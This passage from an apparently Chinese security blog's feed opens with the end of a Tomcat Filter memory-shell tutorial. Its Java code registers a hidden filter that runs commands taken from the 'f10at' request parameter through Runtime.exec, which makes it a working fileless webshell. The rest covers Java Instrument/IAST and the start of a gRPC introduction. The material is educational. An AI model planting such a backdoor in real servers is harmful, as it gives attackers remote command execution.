     <span class="comment">// 修改Tomcat运行时状态</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">            stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            stateField.set(org.apache.catalina.LifecycleState.class,</span><br><span class="line">                    org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 新建一个Filter马</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">shellFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellFilter</span>();</span><br><span class="line">            <span class="comment">// 通过addFilter函数生成FilterDef</span></span><br><span class="line">            FilterRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> servletContext.addFilter(<span class="string">&quot;f10at&quot;</span>, shellFilter);</span><br><span class="line">            registration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 添加URL匹配规则</span></span><br><span class="line">            registration.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST), <span class="literal">false</span>, <span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 恢复Tomcat运行时状态</span></span><br><span class="line">            stateField.set(org.apache.catalina.LifecycleState.class,</span><br><span class="line">                    org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用filterStart方法将FilterDef放入容器中</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">            filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            filterStartMethod.invoke(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将filter插入到filterChain的第一个位置</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="comment">// 执行命令</span></span><br><span class="line">        <span class="keyword">if</span> ((cmd = request.getParameter(<span class="string">&quot;f10at&quot;</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行其他filter</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考">参考</h1><p><a href="https://javasec.org/javaweb/MemoryShell/">JavaWeb 内存马基础· 攻击Java Web应用-Java Web安全</a></p><p><ahref="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">查杀Javaweb filter型内存马 | 回忆飘如雪 (gv7.me)</a></p><p><ahref="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servlet型内存马的扫描抓捕与查杀| 回忆飘如雪 (gv7.me)</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇主要学习针对Java容器的内存马技术，即无文件webshell，由于这些容器运行在内存中，因而也难以检测。Java容器的内存马大体上可以分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Servlet型&lt;/li&gt;
&lt;li&gt;Instrument型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本篇具体内容为Tomcat容器下的Servlet型中的Filter内存马原理和利用方法，另外两个类型原理和Filter类似。Tomcat版本为10。（关于&lt;a
href=&quot;https://lzwgiter.github.io/posts/b92dbb83.html&quot;&gt;Servlet&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/Java内存马原理（一）/e38ce0bab38f1b8757931db3f5dd7a8b.jpeg&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://lzwgiter.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="https://lzwgiter.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="web安全" scheme="https://lzwgiter.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java Instrument机制及管窥IAST</title>
    <link href="https://lzwgiter.github.io/posts/e2947908.html"/>
    <id>https://lzwgiter.github.io/posts/e2947908.html</id>
    <published>2023-07-08T02:20:36.000Z</published>
    <updated>2024-02-08T07:14:35.849Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ul><li><p>Java Instrument机制于JDK1.5版本引入，是一种Java中的字节码增强技术（<em>BytecodeInstrumentation</em>）。可以理解为一种JVM级别的AOP实现方式，可以实现向JVM中一个运行时程序加载一个jar包、并由该jar包对运行时程序进行字节码修改的效果。最初目的为实现JVM监控和类的动态修改。作为插桩技术，其在安全领域的应用包括不限于RASP、IAST等。</p></li><li><p>IAST（<em>Interactive application securitytesting</em>）交互式应用安全检测是一种应用安全测试方法，由Gartner公司与2012年提出。基于instrumentation机制，IAST可以与依赖库进行交互，并从内部对运行时应用进行分析，实现对代码漏洞的发现和诊断。（图片来源<ahref="https://dzone.com/refcardz/introduction-to-iast"title="Introduction to IAST - DZone Refcardz">[1]</a>）</p></li></ul><p><img src="/img/Java-Instrument机制及管窥IAST/10934497-picture3.png" style="zoom:80%;" /></p></blockquote><span id="more"></span><h1 id="java字节码增强技术">Java字节码增强技术</h1><h2 id="工作原理">工作原理</h2><p>Java中的Instrumentation主要依赖于<code>java.lang.instrument</code>包，实现上有两种类型：</p><ul><li>静态（JDK 1.5）——<em>Load-Time Instrumentation</em><ahref="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html"title="JVM Tool Interface version 1.2">[3]</a></li><li>动态（JDK 1.6）——<em>Dynamic Instrumentation</em><ahref="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html"title="JVM Tool Interface version 1.2">[3]</a></li></ul><p>区别在于，<strong>静态方法</strong>可以通过<code>-javaagent</code>参数将要织入的代码以Jar包的方式传递给运行时程序：</p><p><img src="/img/Java-Instrument机制及管窥IAST/image-20230708113322653-1688787210596-3.png" style="zoom:100%;" /></p><p>但这种方式的缺点在于，该agentjar包必须在运行时程序的命令行处加载运行，即JVM开启时载入。现实情况中不一定可以做到通过命令行传入。因而也有了JDK1.6引入的动态的方法。</p><p><strong>动态方法</strong>下，运行时程序可以随时attach一个给定的agentjar包，具有更灵活的特点。</p><p>为了深入了解该机制的工作原理，那就需要先了解JVM中的JVM TI（<em>JVMtool interface</em>）——<strong>Java虚拟机工具接口</strong>。</p><h3 id="jvm-ti">JVM TI</h3><p>JVM TI的前身其实是JVMDI（<em>JVM profilerinterface</em>）和JVMPI（<em>JVM debuginterface</em>），二者分别用于Java程序的调试和调节性功能，后来分别于JDK6、JDK 7被弃用<a href="https://www.jianshu.com/p/fc40ac81730c"title="JVMTI基本介绍 - 简书 (jianshu.com)">[2]</a>。</p><p>JVMTI是一套由虚拟机提供的<code>native</code>接口，通过这些接口可以实现对运行时Java程序的调试，且可以查看该程序的运行状态、<strong>设置回调函数</strong>、控制环境变量等，实现优化程序性能的目的。如Eclipse的调试器就是调用JVMTI实现的。</p><p>该工具位于Java平台调试架构JPDA（<em>Java platform debuggerarchitechture</em>）中的最底层，其中<code>Debuggee</code>是<strong>被调试者</strong>，通过<code>JDWP</code>和<strong>调试者</strong><code>JDI</code>进行通信。</p><p><imgsrc="/img/Java-Instrument机制及管窥IAST/image-20230708142754896-1688797679309-7.png" /></p><blockquote><ul><li>JVM TI is a two-way interface. A client of JVM TI, hereafter calledan <em>agent</em>, can be notified of interesting occurrences throughevents. <ahref="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html"title="JVM Tool Interface version 1.2">[3]</a></li><li>Agents can be informed of many events that occur in applicationprograms. <ahref="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html"title="JVM Tool Interface version 1.2">[3]</a></li></ul></blockquote><p>为了调用JVMTI接口，我们需要传入一个客户端程序——<strong>agent</strong>，并注册一些我们感兴趣的JVM事件（<em>event</em>），当JVM发生了这些事件时，JVMTI服务端就会通过JDWP通知我们的客户端。</p><p>这里虽然也叫<em>agent</em>，但是和我们本文需要关注的、instrument机制的<em>agent</em>有所区别。</p><p>我理解二者是包含关系，即instrument机制传入的agent是要比这里提到的更上层的（即jar包格式）。而这里的agent需要使用C/C++进行开发，在windows中为DLL、Linux下为so，并需要通过下图中的<code>-agentpath</code>参数进行传递，且为绝对路径：</p><p><img src="/img/Java-Instrument机制及管窥IAST/image-20230708143930898-1688798375233-9.png" style="zoom: 100%;" /></p><blockquote><p>The JVM TI specification supports the use of multiple simultaneousJVM TI agents. Each agent has its own JVM TI environment. That is, theJVM TI state is separate for each agent - changes to one environment donot affect the others<ahref="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html"title="JVM Tool Interface version 1.2">[3]</a>.</p></blockquote><p>当然，也支持传入多个agent，每个agent都有自己独立的JVMTI操作环境，互相独立不影响。但最终影响都会反应到JVM上，类似线程并发操作变量问题的感觉。</p><p><strong>介绍就到这里</strong>，回到我们关心的instrument机制本身。</p><p>这里我们需要关注的，就是JVMTI提供的<strong>设置回调函数</strong>的这个功能，JVMTI提供了大量的JVM事件供我们选择：</p><p><img src="/img/Java-Instrument机制及管窥IAST/image-20230708145005415-1688799008906-11.png" style="zoom:70%;" /></p><p>而这里我们需要了解两个事件：<code>JVMTI_EVENT_VM_INIT</code>和<code>JVMTI_EVENT_CLASS_FILE_LOAD_HOOK</code>。</p><ul><li><code>JVMTI_EVENT_VM_INIT</code>标志着JVM初始化的完成，若JVM初始化失败则不会触发该事件。当该事件发生后，agent就可以开始调用任意的JVMTI接口了。</li><li><code>JVMTI_EVENT_CLASS_FILE_LOAD_HOOK</code>标志着JVM已经拿到了class文件，但是还没有将它加载到JVM的内存中去。</li></ul><p>看到第二个事件的含义，大概也就理解了Instrument机制的工作机制了，文档中也写的很清晰：</p><blockquote><p>The agent can instrument the existing class file data sent by the VMto include profiling/debugging hooks. See the description of <ahref="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html#bci">bytecodeinstrumentation</a> for usage information<ahref="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html"title="JVM Tool Interface version 1.2">[3]</a>.</p></blockquote><p>即agent可以关注该事件，并对JVM要加载的class文件进行修改——即<strong>字节码增强技术</strong>。</p><h3 id="流程">流程</h3><p>了解了Instrument机制的底层原理、JVMTI的两个事件后，我们来看一下agent加载的不同阶段，以及整体的一个增强的过程。</p><h4 id="agent生命周期">agent生命周期</h4><p><imgsrc="/img/Java-Instrument机制及管窥IAST/image-20230708162918423.png" /></p><p>首先是start-Up阶段，根据agent是在JVM初始化时加载还是运行施加在，会执行不同的函数。</p><p>对于前者，JVM首先会调用<code>Agent_OnLoad()</code>方法；而后者会调用<code>Agent_OnAttach()</code>方法。最终都会调用<code>Agent_OnUnload()</code>方法结束生命周期。</p><h4 id="java-instrument流程">Java Instrument流程</h4><p>这里以最常见的通过<code>-javaagent</code>加载agent的方式为例，也即静态方式加载。找到了其他大佬博客的一张图，非常清晰<ahref="http://rui0.cn/archives/1063"title="插桩技术在Java安全中的应用简述 - Ruilin (rui0.cn)">[4]</a>：</p><p><imgsrc="/img/Java-Instrument机制及管窥IAST/00218c2023a2ba140887543f88a4fd99.png" /></p><ol type="1"><li>通过<code>-javaagent</code>参数传入agent，JVM初始化时调用<code>Agent_OnLoad()</code>函数。</li><li>在<code>Agent_OnLoad()</code>函数中，通过JVMTI接口，注册<code>VMInit</code>和<code>ClassFileLoadHook</code>事件的<strong>回调函数</strong>。</li><li>JVM启动初始化结束，触发<code>VMInit</code>事件的回调函数，agent<strong>开始执行自己的逻辑</strong>。</li><li>在agent主函数<code>premain</code>中注册自己的字节码修改类<code>ClassFIleTransformer</code>实例。</li><li>运行时程序执行main函数。</li><li>JVM加载*.class文件，触发<code>ClassFileLoadHook</code>事件的回调函数。</li><li>agent执行<code>transform</code>函数，对准备加载的*.class字节码文件进行修改，并返回给JVM。</li></ol><h2 id="一个demo">一个Demo</h2><p>下面写一个Demo，学习一下基本的agent的代码编写方法并通过<code>-javaagent:</code>进行传递，也即<strong>静态的方法</strong>。另外的动态agent方法的编写方法可以参考<ahref="https://developer.aliyun.com/article/1093860"title="[java instrument机制分析与实践-阿里云开发者社区">[5]</a>。</p><p>首先我们定义一个待被织入的对象类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> target;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/7/8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TargetClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">target</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(System.currentTimeMillis());</span><br><span class="line">        System.out.println(<span class="string">&quot;可以我好了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(System.currentTimeMillis());</span><br><span class="line">        System.out.println(<span class="string">&quot;得得得得得！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        foo();</span><br><span class="line">        target();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该程序正常输出结果如下：</p><p><img src="/img/Java-Instrument机制及管窥IAST/image-20230708200319342.png" style="zoom:75%;" /></p><p>下面编写agent，常见的字节码操作工具除了java原生的，还有<code>ASM</code>、<code>Byte Buddy</code>等。ASM由于市面上采用的最多，这里以ASM为例，实现对上述代码输出的改变。</p><p>我们需要借助<code>java.lang.instrument.ClassFileTransformer</code>类，通过实现该接口以编写agent，并通过<code>transform</code>方法来对加载的类进行增强。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> instrument;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.AdviceAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/7/8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstrumentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyClassFileTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                                ProtectionDomain protectionDomain,</span><br><span class="line">                                <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(classfileBuffer);</span><br><span class="line">            <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(classReader, ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">            <span class="type">ClassVisitor</span> <span class="variable">classVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassVisitor</span>(Opcodes.ASM5, classWriter) &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String descriptor,</span></span><br><span class="line"><span class="params">                                                 String signature, String[] exceptions)</span> &#123;</span><br><span class="line">                    <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;target&quot;</span>.equals(name)) &#123;</span><br><span class="line">                        <span class="comment">// 对目标函数进行增强</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AdviceAdapter</span>(Opcodes.ASM5, methodVisitor, access, name, descriptor) &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onMethodEnter</span><span class="params">()</span> &#123;</span><br><span class="line">                                <span class="comment">// 进入方法时</span></span><br><span class="line">                                System.out.println(System.currentTimeMillis());</span><br><span class="line">                                System.out.println(<span class="string">&quot;@ agent @ 嗨嗨嗨！&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onMethodExit</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">                                <span class="comment">// 退出方法时</span></span><br><span class="line">                                System.out.println(System.currentTimeMillis());</span><br><span class="line">                                System.out.println(<span class="string">&quot;@ agent @ 泰裤辣！&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> methodVisitor;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            classReader.accept(classVisitor, ClassReader.SKIP_FRAMES | ClassReader.SKIP_DEBUG);</span><br><span class="line">            <span class="comment">// 返回增强后的字节数组，即字节码</span></span><br><span class="line">            <span class="keyword">return</span> classWriter.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        <span class="comment">// agent的主函数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;@ agent @ premain方法已执行&quot;</span>);</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">MyClassFileTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在resources下写<code>MANIFEST.MF</code>，并将上述代码导出为jar包：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Manifest-Version:</span> <span class="number">1.0</span></span><br><span class="line"><span class="attr">Premain-Class:</span> <span class="string">instrument.InstrumentMain</span></span><br><span class="line"><span class="attr">Can-Redefine-Classes:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">Can-Retransform-Classes:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">(注意这里是有一个空行的)</span></span><br></pre></td></tr></table></figure><p>增加VM Option：</p><p><img src="/img/Java-Instrument机制及管窥IAST/image-20230708195437636-1688817280339-10.png" style="zoom:80%;" /></p><p>运行结果：</p><p><img src="/img/Java-Instrument机制及管窥IAST/image-20230708200148537-1688817709859-13.png" style="zoom: 75%;" /></p><p>从结果可以看出，agent的方法的执行事件均在目标类的方法执行之前，这说明：<strong>agent代码的织入是在目标程序运行之前的</strong>，且当目标程序开始执行函数时、才会触发agent的织入。<strong>这也对应上了在学习JavaInstrument流程时的特点。</strong></p><h1 id="iast">IAST</h1><h2 id="要解决的问题">要解决的问题</h2><p>IAST于2012年被提出，作为一种AST（Application SecurityTesting）方案，在他之前已经有了SAST、DAST了。那么IAST的必要性在哪里？要解决什么问题？</p><p>我个人理解的总结：</p><ul><li><p>技术上，目前市面上SAST的<strong>误报率较高</strong>、DAST需要发送一些<strong>脏数据</strong>，且<strong>无法了解内部执行细节</strong>从而对漏洞真正成因的发现带来一定困难。而IAST无需发送脏数据来触发漏洞，而是通过Instrument机制对调用链进行追踪，从而可以对漏洞的成因得到更深层次的了解。</p></li><li><p>场景上，随着DevOps的发展，为了追求更高效率的交付，DevSecOps的观念被提出、“安全左移”的思想也在不断推进。作为可以与流水线整合的安全测试方案，IAST是一个非常不错的选择。</p></li></ul><p>但是虽然有上述优点，但该基于由于依赖Instrument机制，而不同语言如Python等该机制实现都不一样，因而有100种语言就得设计100种IAST方案，而不像DAST这种更高层面的，与语言无关。抱有兴趣的人可以阅读该材料<ahref="https://www.contrastsecurity.com/whitepaper-iast-vs-dast"title="Revolutionize DAST with IAST | Application Security Testing | Contrast Security">[6]</a>。</p><p>市面上已经有了很多开源产品如火线安全的洞态IAST<ahref="https://dongtai.io/"title="DongTai">[7]</a>、百度的OpenRASP-IAST[<ahref="https://rasp.baidu.com/doc/hacking/architect/iast.html"title="IAST 扫描器 - OpenRASP 官方文档 - 开源自适应安全产品">8</a>][]。商用的如ContrastSecurity的Contrast Assess<ahref="https://www.contrastsecurity.com/contrast-assess"title="Contrast Assess | IAST Security Testing | Contrast Security">[9]</a></p><h2 id="iast分类及流程">IAST分类及流程</h2><p>IAST从流量的性质上，通常认为，IAST可以分为主动式和被动式<ahref="https://doc.dongtai.io/docs/introduction/iast#%E7%B1%BB%E5%9E%8B"title="IAST | 洞态文档 (dongtai.io)">[10]</a><ahref="https://www.contrastsecurity.com/active-passive-iast-whitepaper"title="Active and Passive IAST | Contrast Security">[11]</a>：</p><ul><li><p>被动式：即只需要一个agent即可，使用正常的业务流量进行测试。</p><blockquote><p>Passive IAST is a security tool that requires a single agent to berun alongside an application<ahref="https://www.contrastsecurity.com/active-passive-iast-whitepaper"title="Active and Passive IAST | Contrast Security">[11]</a>.</p></blockquote><p><imgsrc="/img/Java-Instrument机制及管窥IAST/zh_passive_iast-49d405526cb4b26c197f015028725f98-1688819976558-20.png" /></p></li><li><p>主动式：不仅需要一个agent，还需要一个传统的DAST工具产生攻击流量，由IAST提供攻击的具体细节。</p><blockquote><p>This approach requires two main components — a DAST tool and a sensorthat attaches to running applications<ahref="https://www.contrastsecurity.com/active-passive-iast-whitepaper"title="Active and Passive IAST | Contrast Security">[11]</a>.</p></blockquote><p><imgsrc="/img/Java-Instrument机制及管窥IAST/zh_active_iast-25d4ed1046040d6cab6a59dce3338cbc.png" /></p></li></ul><h1 id="参考">参考</h1>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Java Instrument机制于JDK
1.5版本引入，是一种Java中的字节码增强技术（&lt;em&gt;Bytecode
Instrumentation&lt;/em&gt;）。可以理解为一种JVM级别的AOP实现方式，可以实现向JVM中一个运行时程序加载一个jar包、并由该jar包对运行时程序进行字节码修改的效果。最初目的为实现JVM监控和类的动态修改。作为插桩技术，其在安全领域的应用包括不限于RASP、IAST等。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;IAST（&lt;em&gt;Interactive application security
testing&lt;/em&gt;）交互式应用安全检测是一种应用安全测试方法，由Gartner公司与2012年提出。基于instrumentation机制，IAST可以与依赖库进行交互，并从内部对运行时应用进行分析，实现对代码漏洞的发现和诊断。（图片来源&lt;a
href=&quot;https://dzone.com/refcardz/introduction-to-iast&quot;
title=&quot;Introduction to IAST - DZone Refcardz&quot;&gt;[1]&lt;/a&gt;）&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/img/Java-Instrument机制及管窥IAST/10934497-picture3.png&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="DevSecOps" scheme="https://lzwgiter.github.io/categories/DevSecOps/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="DevSecOps" scheme="https://lzwgiter.github.io/tags/DevSecOps/"/>
    
  </entry>
  
  <entry>
    <title>gRPC简介与使用</title>
    <link href="https://lzwgiter.github.io/posts/479daa6d.html"/>
    <id>https://lzwgiter.github.io/posts/479daa6d.html</id>
    <published>2023-07-03T02:31:33.000Z</published>
    <updated>2023-10-09T12:20:18.756Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>gRPC是谷歌设计的一个开源RPC（Remote ProcessCall）框架，其基于谷歌开发的<ahref="https://protobuf.dev/overview/">ProtocolBuffer</a>（也支持其他数据结构如JSON、XML等），提供了一种分布式系统内部各个微服务之间互相调用的方法，具有语言无关、平台无关、高效（HTTP/2）、安全（TLS）、可扩展性强的特点，已被广泛应用于诸多公司如：NetFlex、Square、Cisco等。</p><p><img src="/img/gRPC简介与使用/image-20230701104730528.png" /></p></blockquote><span id="more"></span><h1 id="rpc-or-http">RPC or HTTP?</h1><p>正式学习之前讨论一个有意思的话题，即RPC技术和HTTP协议在分布式系统中，有何区别呢？</p><h2 id="目的及区别">目的及区别</h2><p>一个自然的问题就是，RPC和HTTP都可以实现C/S之间的沟通，比如现行的微服务架构中，提倡RESTful风格，服务与服务之间都是通过暴露HTTPendpoint并通过HTTP协议、JSON数据格式进行通信的。而RPC也广泛应用于分布式系统内部各个服务之间的互相调用，比如JavaRMI技术以及今天学习的gRPC框架。</p><blockquote><p>那区别和要解决的问题是什么呢？</p></blockquote><p>总的来说，个人理解区别如下：</p><ul><li>RPC多用于分布式系统中，HTTP多用于B/S架构。</li><li>RPC关注点是网络通信的本地透明化，HTTP关注点是WWW上资源的访问</li></ul><p>下面具体讨论一下二者出现要解决的问题和区别。从出现时间上来讲，<strong>RPC出现的时间是要比HTTP早的</strong>。</p><p>根据wiki描述，1960年代就出现了分布式计算中的<code>Request-Response</code>协议，1970年代出现了RPC的模型，如ARPANET（早期互联网）文档中就有采用，1980年代有了一些实用的实现。而<em>RemoteProcess Call(RPC)</em>一词是由Bruce Jay Nelson于1981年提出的。</p><blockquote><p>a <strong>remote procedure call</strong> (<strong>RPC</strong>) iswhen a computer program causes a procedure (subroutine) to execute in adifferent address space (commonly on another computer on a sharednetwork), which is written as if it were a normal (local) procedurecall, without the programmer explicitly 